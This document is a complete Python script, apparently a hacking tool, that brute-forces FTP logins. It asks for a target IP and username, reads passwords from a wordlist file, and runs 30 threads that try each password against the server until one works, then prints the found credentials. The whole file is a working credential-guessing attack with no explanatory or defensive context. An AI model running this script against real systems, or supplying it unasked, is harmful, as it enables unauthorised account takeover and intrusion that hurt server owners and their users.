import ftplib
from threading import Thread 
import queue
from colorama import init, Fore


q = queue.Queue()

n_threads = 30
host = input ("Enter Target IP Address: ")
user = input ("Enter Target Username: ")
port = 21

def connect_ftp():
    global q
    while True:
        password = q.get()
        server = ftplib.FTP()
        print(f'[!] Trying: {password}')
        try:
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        else:
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f'\tPassword: {password}{Fore.RESET}')

            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            q.task_done()
        
passwords = open('wordlist.txt').read().split('\n')
print('[+] Passwords to try: ', len(passwords))    

for password in passwords:
    q.put(password)

for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    thread.daemon = True
    thread.start()

q.join()
